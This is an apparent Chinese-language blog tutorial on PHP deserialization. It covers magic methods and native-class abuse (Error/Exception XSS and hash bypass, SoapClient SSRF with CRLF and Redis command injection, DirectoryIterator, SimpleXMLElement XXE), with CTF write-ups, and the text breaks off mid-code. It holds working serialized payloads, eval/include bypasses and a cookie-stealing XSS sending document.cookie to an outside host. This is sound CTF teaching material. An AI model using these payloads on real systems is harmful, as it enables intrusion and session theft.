---
title: php反序列化
date: 2023-08-08 14:25:15
categories:
  - 网络安全
tags:
  - web
description: |
  php反序列化
---

## 反序列化

### 魔术函数

#### __get、__set

这两个方法是为在类和他们的父类中没有声明的属性而设计的

`__get( $property )` 当调用一个未定义的属性时访问此方法
`__set( $property, $value )` 给一个未定义的属性赋值时调用
这里的没有声明包括访问控制为proteced,private的属性（即没有权限访问的属性）

#### __isset、__unset

`__isset( $property )` 当在一个未定义的属性上调用`isset()`函数时调用此方法
`__unset( $property )` 当在一个未定义的属性上调用`unset()`函数时调用此方法
与__get方法和__set方法相同，这里的没有声明包括访问控制为proteced,private的属性（即没有权限访问的属性）

#### __call

`__call( $method, $arg_array )` 当调用一个未定义(包括没有权限访问)的方法是调用此方法

#### __autoload

`__autoload` 函数，使用尚未被定义的类时自动调用。通过此函数，脚本引擎在 PHP 出错失败前有了最后一个机会加载所需的类。
注意: 在 __autoload 函数中抛出的异常不能被 catch 语句块捕获并导致致命错误。

#### __construct、__destruct

`__construct` 构造方法，当一个对象被创建时调用此方法，好处是可以使构造方法有一个独一无二的名称，无论它所在的类的名称是什么，这样你在改变类的名称时，就不需要改变构造方法的名称
`__destruct` 析构方法，PHP将在对象被销毁前（即从内存中清除前）调用这个方法
默认情况下,PHP仅仅释放对象属性所占用的内存并销毁对象相关的资源.，析构函数允许你在使用一个对象之后执行任意代码来清除内存，当PHP决定你的脚本不再与对象相关时，析构函数将被调用.
在一个函数的命名空间内，这会发生在函数return的时候，对于全局变量，这发生于脚本结束的时候，如果你想明确地销毁一个对象，你可以给指向该对象的变量分配任何其它值，通常将变量赋值勤为NULL或者调用unset。

#### __clone

PHP5中的对象赋值是使用的引用赋值，使用clone方法复制一个对象时，对象会自动调用__clone魔术方法，如果在对象复制需要执行某些初始化操作，可以在__clone方法实现。

#### __toString

`__toString`方法在将一个对象转化成字符串时自动调用，比如使用`echo`打印对象时。
(1)  `echo($obj) / print($obj)` 打印时会触发
(2) 反序列化对象与字符串连接时
(3) 反序列化对象参与格式化字符串时
(4) 反序列化对象与字符串进行==比较时（PHP进行==比较的时候会转换参数类型）
(5) 反序列化对象参与格式化SQL语句，绑定参数时
(6) 反序列化对象在经过php字符串函数，如 `strlen()`、`addslashes()`时
(7) 在`in_array()`方法中，第一个参数是反序列化对象，第二个参数的数组中有`toString`返回的字符串的时候`toString`会被调用
(8) 反序列化的对象作为 `class_exists()` 的参数的时候
如果类没有实现此方法，则无法通过echo打印对象，否则会显示：`Catchable fatal error: Object of class test could not be converted to string in`，此方法必须返回一个字符串。

在PHP 5.2.0之前，`__toString`方法只有结合使用`echo()` 或 `print()`时 才能生效。PHP 5.2.0之后，则可以在任何字符串环境生效（例如通过`printf()`，使用%s修饰符），但 不能用于非字符串环境（如使用%d修饰符）

从PHP 5.2.0，如果将一个未定义`__toString`方法的对象 转换为字符串，会报出一个`E_RECOVERABLE_ERROR`错误。

#### __sleep、__wakeup

`__sleep` 使用serialize时触发 ，在对象被序列化前自动调用，该函数需要返回以类成员变量名作为元素的数组(该数组里的元素会影响类成员变量是否被序列化。只有出现在该数组元素里的类成员变量才会被序列化)

`__wakeup` 使用unserialize时触发，反序列化恢复对象之前调用该方法

`serialize()` 检查类中是否有魔术名称 __sleep 的函数。如果这样，该函数将在任何序列化之前运行。它可以清除对象并应该返回一个包含有该对象中应被序列化的所有变量名的数组。

使用 `__sleep` 的目的是关闭对象可能具有的任何数据库连接，提交等待中的数据或进行类似的清除任务。此外，如果有非常大的对象而并不需要完全储存下来时此函数也很有用。

相反地，`unserialize()` 检查具有魔术名称 `__wakeup` 的函数的存在。如果存在，此函数可以重建对象可能具有的任何资源。使用`__wakeup` 的目的是重建在序列化中可能丢失的任何数据库连接以及处理其它重新初始化的任务。

#### __set_state

当调用`var_export()`时，这个静态 方法会被调用（自PHP 5.1.0起有效）。本方法的唯一参数是一个数组，其中包含按`array(’property’ => value, …)`格式排列的类属性。

#### __invoke

当尝试以调用函数的方式调用一个对象时，`__invoke` 方法会被自动调用。PHP5.3.0以上版本有效

#### __callStatic

它的工作方式类似于 `__call()` 魔术方法，`__callStatic()` 是为了处理静态方法调用，PHP5.3.0以上版本有效，PHP 确实加强了对 `__callStatic()` 方法的定义；它必须是公共的，并且必须被声明为静态的。
同样，`__call()` 魔术方法必须被定义为公共的，所有其他魔术方法都必须如此。

#### __serialize()、__unserialize()

当 `__wakeup()` 和 `__unserialize()` 同时存在时, 仅会执行 `__unserialize()`方法
当存在 `__serialize()` 时, `$data` 的值为该方法返回的数组, 否则为一个包含反序列化后的全部属性的数组

序列化格式中的字母含义：

```bash
a - array                    b - boolean  
d - double                   i - integer
o - common object            r - reference
s - string                   C - custom object
O - class                  N - null
R - pointer reference      U - unicode string
```

### POP链利用技巧

#### 一些有用的POP链中出现的方法

* 命令执行：exec()、passthru()、popen()、system()
* 文件操作：file_put_contents()、file_get_contents()、unlink()
* 代码执行：eval()、assert()、call_user_func()

#### 反序列化十六进制绕过关键字

PHP 为了更加方便进行反序列化 Payload 的 传输与显示(避免丢失某些控制字符等信息)，我们可以在序列化内容中用大写S表示字符串，此时这个字符串就支持将后面的字符串用16进制表示，使用如下形式即可绕过
`s:4:"user"; -> S:4:"use\72";`
在反序列化时，序列化中的十六进制会被转化成字母
当过滤了c2e38 ，即可用 \63\32\65\33\38 替代，S解析十六进制

```php
username:y1ng\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0
password:";S:11:"\00*\00password";O:8:"Hacker_A":1:{S:5:"\63\32\65\33\38";O:8:"Hacker_B":1:{S:5:"\63\32\65\33\38";O:8:"Hacker_C":1:{s:4:"name";s:4:"test";}}};s:1:"a";s:0:"
```

`\00` 会被替换为 `%00`
`\65` 会被替换为 `e`

过滤了`%00`，可用`S`来代替序列化字符串的`s`来绕过，在`S`情况下`\00` 会被解析成`%00`

序列化时类中私有变量和受保护变量，php7.1+ 对属性并不敏感，public 也可用于protected：
private反序列化后是%00(类名)%00(变量名)，protect是`%00*%00`(变量名)

### PHP 原生类的利用小结

在CTF题目中，好几次都遇到了利用 PHP 原生类进行XSS、反序列化、SSRF以及XXE的思路，一直想好好看一下 PHP 原生类在 CTF
中的利用，迫于生活xx拖了好久。今天终于有机会好好总结总结了。常遇到的几个 PHP 原生类有如下几个：

* Error
* Exception
* SoapClient
* DirectoryIterator
* SimpleXMLElement

下面我们根据这几个原生类的利用方式分别进行讲解。

#### 使用 Error/Exception 内置类进行 XSS

##### Error 内置类

* 适用于php7版本
* 在开启报错的情况下

Error类是php的一个内置类，用于自动自定义一个Error，在php7的环境下可能会造成一个xss漏洞，因为它内置有一个 `__toString()`
的方法，常用于PHP 反序列化中。如果有个POP链走到一半就走不通了，不如尝试利用这个来做一个xss，其实我看到的还是有好一些cms会选择直接使用
`echo <Object>` 的写法，当 PHP 对象被当作一个字符串输出或使用时候（如`echo`的时候）会触发`__toString`
方法，这是一种挖洞的新思路。

下面演示如何使用 Error 内置类来构造 XSS。

测试代码：

```php
    <?php
    $a = unserialize($_GET['whoami']);
    echo $a;
    ?>
```

（这里可以看到是一个反序列化函数，但是没有让我们进行反序列化的类啊，这就遇到了一个反序列化但没有POP链的情况，所以只能找到PHP内置类来进行反序列化）

给出POC：

```php
    <?php
    $a = new Error("<script>alert('xss')</script>");
    $b = serialize($a);
    echo urlencode($b);  
    ?>
    
    //输出: O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D
```

成功弹窗。

##### Exception 内置类

* 适用于php5、7版本
* 开启报错的情况下

测试代码：

```php
    <?php
    $a = unserialize($_GET['whoami']);
    echo $a;
    ?>
```

给出POC：

```php  
    <?php
    $a = new Exception("<script>alert('xss')</script>");
    $b = serialize($a);
    echo urlencode($b);  
    ?>
    
    //输出: O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D
```

###### [BJDCTF 2nd]xss之光

进入题目，首先通过git泄露拿到源码：

```PHP
    <?php
    $a = $_GET['yds_is_so_beautiful'];
    echo unserialize($a);
```

仅看到一个反序列化函数并没有给出需要反序列化的类，这就遇到了一个反序列化但没有POP链的情况，所以只能找到PHP内置类来进行反序列化。又发现有个echo，没得跑了，就是我们刚才演示的利用Error或Exception内置类进行XSS，但是查看一下题目的环境发现是PHP
5，所以我们要使用Exception类。

由于此题是xss，所以只要xss执行window.open()就能把flag带出来，所以POC如下：

```PHP
    <?php
    $poc = new Exception("<script>window.open('http://de28dfb3-f224-48d4-b579-f1ea61189930.node3.buuoj.cn/?'+document.cookie);</script>");
    echo urlencode(serialize($poc));
    ?>
```

得到payload如下：

```PHP
    /?yds_is_so_beautiful=O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A109%3A%22%3Cscript%3Ewindow.open%28%27http%3A%2F%2Fde28dfb3-f224-48d4-b579-f1ea61189930.node3.buuoj.cn%2F%3F%27%2Bdocument.cookie%29%3B%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D
```

执行后，得到flag就在 cookie 中：

#### 使用 Error/Exception 内置类绕过哈希比较

在上文中，我们已经认识了Error和Exception这两个PHP内置类，但对他们妙用不仅限于
XSS，还可以通过巧妙的构造绕过md5()函数和sha1()函数的比较。这里我们就要详细的说一下这个两个错误类了。

##### Error 类

**Error** 是所有PHP内部错误类的基类，该类是在PHP 7.0.0 中开始引入的。

**类摘要：**

```PHP
    Error implements Throwable {
        /* 属性 */
        protected string $message ;
        protected int $code ;
        protected string $file ;
        protected int $line ;
        /* 方法 */
        public __construct ( string $message = "" , int $code = 0 , Throwable $previous = null )
        final public getMessage ( ) : string
        final public getPrevious ( ) : Throwable
        final public getCode ( ) : mixed
        final public getFile ( ) : string
        final public getLine ( ) : int
        final public getTrace ( ) : array
        final public getTraceAsString ( ) : string
        public __toString ( ) : string
        final private __clone ( ) : void
    }
```

**类属性：**

* message：错误消息内容
* code：错误代码
* file：抛出错误的文件名
* line：抛出错误在该文件中的行数

**类方法：**

* [`Error::__construct`](https://www.php.net/manual/zh/error.construct.php) — 初始化 error 对象
* [`Error::getMessage`](https://www.php.net/manual/zh/error.getmessage.php) — 获取错误信息
* [`Error::getPrevious`](https://www.php.net/manual/zh/error.getprevious.php) — 返回先前的 Throwable
* [`Error::getCode`](https://www.php.net/manual/zh/error.getcode.php) — 获取错误代码
* [`Error::getFile`](https://www.php.net/manual/zh/error.getfile.php) — 获取错误发生时的文件
* [`Error::getLine`](https://www.php.net/manual/zh/error.getline.php) — 获取错误发生时的行号
* [`Error::getTrace`](https://www.php.net/manual/zh/error.gettrace.php) — 获取调用栈（stack trace）
* [`Error::getTraceAsString`](https://www.php.net/manual/zh/error.gettraceasstring.php) — 获取字符串形式的调用栈（stack trace）
* [`Error::__toString`](https://www.php.net/manual/zh/error.tostring.php) — error 的字符串表达
* [`Error::__clone`](https://www.php.net/manual/zh/error.clone.php) — 克隆 error

##### Exception 类

**Exception** 是所有异常的基类，该类是在PHP 5.0.0 中开始引入的。

**类摘要：**

```PHP
    Exception {
        /* 属性 */
        protected string $message ;
        protected int $code ;
        protected string $file ;
        protected int $line ;
        /* 方法 */
        public __construct ( string $message = "" , int $code = 0 , Throwable $previous = null )
        final public getMessage ( ) : string
        final public getPrevious ( ) : Throwable
        final public getCode ( ) : mixed
        final public getFile ( ) : string
        final public getLine ( ) : int
        final public getTrace ( ) : array
        final public getTraceAsString ( ) : string
        public __toString ( ) : string
        final private __clone ( ) : void
    }
```

**类属性：**

* message：异常消息内容
* code：异常代码
* file：抛出异常的文件名
* line：抛出异常在该文件中的行号

**类方法：**

* [`Exception::__construct`](https://www.php.net/manual/zh/exception.construct.php) — 异常构造函数
* [`Exception::getMessage`](https://www.php.net/manual/zh/exception.getmessage.php) — 获取异常消息内容
* [`Exception::getPrevious`](https://www.php.net/manual/zh/exception.getprevious.php) — 返回异常链中的前一个异常
* [`Exception::getCode`](https://www.php.net/manual/zh/exception.getcode.php) — 获取异常代码
* [`Exception::getFile`](https://www.php.net/manual/zh/exception.getfile.php) — 创建异常时的程序文件名称
* [`Exception::getLine`](https://www.php.net/manual/zh/exception.getline.php) — 获取创建的异常所在文件中的行号
* [`Exception::getTrace`](https://www.php.net/manual/zh/exception.gettrace.php) — 获取异常追踪信息
* [`Exception::getTraceAsString`](https://www.php.net/manual/zh/exception.gettraceasstring.php) — 获取字符串类型的异常追踪信息
* [`Exception::__toString`](https://www.php.net/manual/zh/exception.tostring.php) — 将异常对象转换为字符串
* [`Exception::__clone`](https://www.php.net/manual/zh/exception.clone.php) — 异常克隆

我们可以看到，在Error和Exception这两个PHP原生类中内只有 `__toString` 方法，这个方法用于将异常或错误对象转换为字符串。

我们以Error为例，我们看看当触发他的 `__toString` 方法时会发生什么：

```PHP
    <?php
    $a = new Error("payload",1);
    echo $a;
```

输出如下

```PHP
    Error: payload in /usercode/file.php:2
    Stack trace:
    #0 {main}
```

发现这将会以字符串的形式输出当前报错，包含当前的错误信息（"payload"）以及当前报错的行号（"2"），而传入 `Error("payload",1)`
中的错误代码“1”则没有输出出来。

在来看看下一个例子：

```PHP
    <?php
    $a = new Error("payload",1);$b = new Error("payload",2);
    echo $a;
    echo "\r\n\r\n";
    echo $b;

输出如下：

    Error: payload in /usercode/file.php:2
    Stack trace:
    #0 {main}
    
    Error: payload in /usercode/file.php:2
    Stack trace:
    #0 {main}
```

可见，`$a` 和 `$b` 这两个错误对象本身是不同的，但是 `__toString` 方法返回的结果是相同的。注意，这里之所以需要在同一行是因为
`__toString` 返回的数据包含当前行号。

Exception 类与 Error 的使用和结果完全一样，只不过 `Exception` 类适用于PHP 5和7，而 `Error` 只适用于 PHP
7。

Error和Exception类的这一点在绕过在PHP类中的哈希比较时很有用，具体请看下面这道例题。

###### [2020 极客大挑战]Greatphp

进入题目，给出源码：

```PHP
    <?php
    error_reporting(0);
    class SYCLOVER {
        public $syc;
        public $lover;
    
        public function __wakeup(){
            if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) ){
               if(!preg_match("/\<\?php|\(|\)|\"|\'/", $this->syc, $match)){
                   eval($this->syc);
               } else {
                   die("Try Hard !!");
               }
    
            }
        }
    }
    
    if (isset($_GET['great'])){
        unserialize($_GET['great']);
    } else {
        highlight_file(__FILE__);
    }
    
    ?>
```

可见，需要进入eval()执行代码需要先通过上面的if语句：
`if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) )`

这个乍看一眼在ctf的基础题目中非常常见，一般情况下只需要使用数组即可绕过。但是这里是在类里面，我们当然不能这么做。

这里的考点是md5()和sha1()可以对一个类进行hash，并且会触发这个类的 `__toString`
方法；且当eval()函数传入一个类对象时，也会触发这个类里的 `__toString` 方法。

所以我们可以使用含有 `__toString` 方法的PHP内置类来绕过，用的两个比较多的内置类就是 `Exception` 和 `Error`
，他们之中有一个 `__toString` 方法，当类被当做字符串处理时，就会调用这个函数。

根据刚才讲的Error类和Exception类中 `__toString` 方法的特性，我们可以用这两个内置类进行绕过。

由于题目用preg_match过滤了小括号无法调用函数，所以我们尝试直接 `include "/flag"`
将flag包含进来即可。由于过滤了引号，我们直接用url取反绕过即可。

POC如下：

```php
    <?php
    
    class SYCLOVER {
        public $syc;
        public $lover;
        public function __wakeup(){
            if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) ){
               if(!preg_match("/\<\?php|\(|\)|\"|\'/", $this->syc, $match)){
                   eval($this->syc);
               } else {
                   die("Try Hard !!");
               }
    
            }
        }
    }
    
    $str = "?><?=include~".urldecode("%D0%99%93%9E%98")."?>";
    /* 
    或使用[~(取反)][!%FF]的形式，
    即: $str = "?><?=include[~".urldecode("%D0%99%93%9E%98")."][!.urldecode("%FF")."]?>";    
    
    $str = "?><?=include $_GET[_]?>"; 
    */
    $a=new Error($str,1);$b=new Error($str,2);
    $c = new SYCLOVER();
    $c->syc = $a;
    $c->lover = $b;
    echo(urlencode(serialize($c)));
    
    ?>
```

这里 `$str = "?><?=include~".urldecode("%D0%99%93%9E%98")."?>";` 中为什么要在前面加上一个
`?>` 呢？因为 `Exception` 类与 `Error` 的 `__toString`
方法在eval()函数中输出的结果是不可能控的，即输出的报错信息中，payload前面还有一段杂乱信息“Error: ”：

```php
    Error: payload in /usercode/file.php:2
    Stack trace:
    #0 {main}
```

进入eval()函数会类似于：`eval("...Error: <?php payload ?>")`。所以我们要用 `?>` 来闭合一下，即
`eval("...Error: ?><?php payload ?>")`，这样我们的payload便能顺利执行了。

生成的payload如下：

```php
    O%3A8%3A%22SYCLOVER%22%3A2%3A%7Bs%3A3%3A%22syc%22%3BO%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A20%3A%22%3F%3E%3C%3F%3Dinclude%7E%D0%99%93%9E%98%3F%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A1%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A19%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7Ds%3A5%3A%22lover%22%3BO%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A20%3A%22%3F%3E%3C%3F%3Dinclude%7E%D0%99%93%9E%98%3F%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A2%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A19%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D%7D
```

执行便可得到flag：

#### 使用 SoapClient 类进行 SSRF

##### SoapClient 类

PHP 的内置类 SoapClient 是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。

类摘要如下：

```php
    SoapClient {
        /* 方法 */
        public __construct ( string|null $wsdl , array $options = [] )
        public __call ( string $name , array $args ) : mixed
        public __doRequest ( string $request , string $location , string $action , int $version , bool $oneWay = false ) : string|null
        public __getCookies ( ) : array
        public __getFunctions ( ) : array|null
        public __getLastRequest ( ) : string|null
        public __getLastRequestHeaders ( ) : string|null
        public __getLastResponse ( ) : string|null
        public __getLastResponseHeaders ( ) : string|null
        public __getTypes ( ) : array|null
        public __setCookie ( string $name , string|null $value = null ) : void
        public __setLocation ( string $location = "" ) : string|null
        public __setSoapHeaders ( SoapHeader|array|null $headers = null ) : bool
        public __soapCall ( string $name , array $args , array|null $options = null , SoapHeader|array|null $inputHeaders = null , array &$outputHeaders = null ) : mixed
    }
```

可以看到，该内置类有一个 `__call` 方法，当 `__call` 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 `__call`
方法，使得 SoapClient 类可以被我们运用在 SSRF 中。SoapClient 这个类也算是目前被挖掘出来最好用的一个内置类。

该类的构造函数如下：

`public SoapClient :: SoapClient(mixed $wsdl [，array $options ])`

* 第一个参数是用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式。
* 第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。

##### 使用 `SoapClient` 类进行 SSRF

知道上述两个参数的含义后，就很容易构造出SSRF的利用Payload了。我们可以设置第一个参数为null，然后第二个参数的location选项设置为target_url。

```php
    <?php
    $a = new SoapClient(null,array('location'=>'http://47.xxx.xxx.72:2333/aaa', 'uri'=>'http://47.xxx.xxx.72:2333'));
    $b = serialize($a);
    echo $b;
    $c = unserialize($b);
    $c->a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf
    ?>
```

首先在47.xxx.xxx.72上面起个监听：

然后执行上述代码，如下图所示成功触发SSRF，47.xxx.xxx.72上面收到了请求信息：

但是，由于它仅限于HTTP/HTTPS协议，所以用处不是很大。而如果这里HTTP头部还存在CRLF漏洞的话，但我们则可以通过SSRF+CRLF，插入任意的HTTP头。

如下测试代码，我们在HTTP头中插入一个cookie：

```php
    <?php
    $target = 'http://47.xxx.xxx.72:2333/';
    $a = new SoapClient(null,array('location' => $target, 'user_agent' => "WHOAMI\r\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4", 'uri' => 'test'));
    $b = serialize($a);
    echo $b;
    $c = unserialize($b);
    $c->a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf
    ?>
```

执行代码后，如下图所示，成功在HTTP头中插入了一个我们自定义的cookie：

可以再去drops回顾一下如何通过HTTP协议去攻击Redis的：[Trying to hack Redis via HTTP
requests](http://wooyun.jozxing.cc/static/drops/papers-3062.html)

如下测试代码：

```php
    <?php
    $target = 'http://47.xxx.xxx.72:6379/';
    $poc = "CONFIG SET dir /var/www/html";
    $a = new SoapClient(null,array('location' => $target, 'uri' => 'hello^^'.$poc.'^^hello'));
    $b = serialize($a);
    $b = str_replace('^^',"\n\r",$b); 
    echo $b;
    $c = unserialize($b);
    $c->a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf
    ?>
```

执行代码后，如下图所示，成功插入了Redis命令：

这样我们就可以利用HTTP协议去攻击Redis了。

对于如何发送POST的数据包，这里面还有一个坑，就是 `Content-Type` 的设置，因为我们要提交的是POST数据 `Content-Type`
的值我们要设置为 `application/x-www-form-urlencoded`，这里如何修改 `Content-Type` 的值呢？由于
`Content-Type` 在 `User-Agent` 的下面，所以我们可以通过 `SoapClient` 来设置 `User-Agent` ，将原来的
`Content-Type` 挤下去，从而再插入一个新的 `Content-Type` 。

测试代码如下：

```php
    <?php
    $target = 'http://47.xxx.xxx.72:2333/';
    $post_data = 'data=whoami';
    $headers = array(
        'X-Forwarded-For: 127.0.0.1',
        'Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93'
    );
    $a = new SoapClient(null,array('location' => $target,'user_agent'=>'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '. (string)strlen($post_data).'^^^^'.$post_data,'uri'=>'test'));
    $b = serialize($a);
    $b = str_replace('^^',"\n\r",$b);
    echo $b;
    $c = unserialize($b);
    $c->a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf
    ?>
```

执行代码后，如下图所示，成功发送POST数据：

###### bestphp's revenge

bestphp's revenge 这道题利用的就是这个点，即对 SoapClient 类进行反序列化触发 SSRF，并配合CRLF构造payload。

进入题目，给出源码：

扫描目录发现flag.php：

可见当REMOTE_ADDR等于127.0.0.1时，就会在session中插入flag，就能得到flag。很明显了，要利用ssrf。

但是这里并没有明显的ssrf利用点，所以我们想到利用PHP原生类SoapClient触发反序列化导致SSRF。并且，由于flag会被插入到session中，所以我们就一定需要携带一个cookie即PHPSESSID去访问它来生成这个session文件。

写出最后的POC：

```php
    <?php
    $target = "http://127.0.0.1/flag.php";
    $attack = new SoapClient(null,array('location' => $target,
        'user_agent' => "N0rth3ty\r\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4\r\n",
        'uri' => "123"));
    $payload = urlencode(serialize($attack));
    echo $payload;
```

生成payload：

`O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A3%3A%22123%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A56%3A%22N0rth3ty%0D%0ACookie%3A+PHPSESSID%3Dtcjr6nadpk3md7jbgioa6elfk4%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D`

这里这个POC就是利用CRLF伪造本地请求SSRF去访问flag.php，并将得到的flag结果保存在cookie为
`PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4` 的session中。

然后，我们就要想办法反序列化这个对象，但这里有没有反序列化点，那么我们怎么办呢？我们在题目源码中发现了session_start();，很明显，我们可以用session反序列化漏洞。但是如果想要利用session反序列化漏洞的话，我们必须要有
`ini_set()` 这个函数来更改 `session.serialize_handler`
的值，将session反序列化引擎修改为其他的引擎，本来应该使用ini_set()这个函数的，但是这个函数不接受数组，所以就不行了。于是我们就用session_start()函数来代替，即构造
`session_start(serialize_handler=php_serialize)` 就行了。我们可以利用题目中的
`call_user_func($_GET['f'], $_POST);`
函数，传入GET：/?f=session_start、POST：serialize_handler=php_serialize，实现
`session_start(serialize_handler=php_serialize)`
的调用来修改此页面的序列化引擎为php_serialize。

所以，我们第一次传值先注入上面POC生成的payload创建并得到我们的session：

此时，我们成功将我们php原生类SoapClient构造的payload传入了 `PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4`
的session中，当页面重新加载时，就会自动将其反序列化。但此时还不会触发SSRF，需要触发 `__call`
方法来造成SSRF，该方法在访问对象中一个不存在的方法时会被自动调用，所以单纯反序列化还不行，我们还需要访问该对象中一个不存在的方法，这里就用到了如下这段代码：

```php
    $a = array(reset($_SESSION), 'welcome_to_the_lctf2018');
    call_user_func($b, $a);
```

我们可以利用extract函数将变量b覆盖为call_user_func，这样，就成了：

`call_user_func(call_user_func, array(reset($_SESSION), 'welcome_to_the_lctf2018'));`

call_user_func()函数有一个特性，就是当只传入一个数组时，可以用call_user_func()来调用一个类里面的方法，call_user_func()会将这个数组中的第一个值当做类名，第二个值当做方法名。

这样也就是会访问我们构造的session对象中的welcome_to_the_lctf2018方法，而welcome_to_the_lctf2018方法不存在，就会触发
`__call` 方法，造成ssrf去访问flag.php。

所以我们第二次传参如下：

最后，我们第三次传参，用我们POC里面自己设置的cookie（`PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4`）去访问这个页面，`var_dump($_SESSION);`
会将 `PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4` 的这个session内容输出出来，即可得到flag：

#### 使用 DirectoryIterator 类绕过 open_basedir

DirectoryIterator 类提供了一个用于查看文件系统目录内容的简单接口，该类是在 PHP 5 中增加的一个类。

DirectoryIterator与glob://协议结合将无视open_basedir对目录的限制，可以用来列举出指定目录下的文件。

测试代码：

```php
    // test.php
    <?php
    $dir = $_GET['whoami'];
    $a = new DirectoryIterator($dir);
    foreach($a as $f){
        echo($f->__toString().'<br>');
    }
    ?>
    
    # payload一句话的形式:
    $a = new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().'<br>');}
```

我们输入 `/?whoami=glob:///*` 即可列出根目录下的文件：
但是会发现只能列根目录和open_basedir指定的目录的文件，不能列出除前面的目录以外的目录中的文件，且不能读取文件内容。

#### 使用 SimpleXMLElement 类进行 XXE

SimpleXMLElement 这个内置类用于解析 XML 文档中的元素。

##### SimpleXMLElement

官方文档中对于SimpleXMLElement 类的构造方法 `SimpleXMLElement::__construct` 的定义如下：

可以看到通过设置第三个参数 data_is_url 为 `true`，我们可以实现远程xml文件的载入。第二个参数的常量值我们设置为`2`即可。第一个参数
data 就是我们自己设置的payload的url地址，即用于引入的外部实体的url。

这样的话，当我们可以控制目标调用的类的时候，便可以通过 SimpleXMLElement 这个内置类来构造 XXE。

###### [SUCTF 2018]Homework

进入题目，随便注册一个账号，登录作业平台。看到一个 `calc` 计算器类的代码。有两个按钮，一个用于调用 `calc`
类实现两位数的四则运算。另一个用于上传文件，提交代码。

`calc` 计算器类的代码为：

```php
    <?php 
    class calc{
        function __construct__(){
            calc();
        }
    
        function calc($args1,$method,$args2){
            $args1=intval($args1);
            $args2=intval($args2);
            switch ($method) {
                case 'a':
                    $method="+";
                    break;
    
                case 'b':
                    $method="-";
                    break;
    
                case 'c':
                    $method="*";
                    break;
    
                case 'd':
                    $method="/";
                    break;
    
                default:
                    die("invalid input");
            }
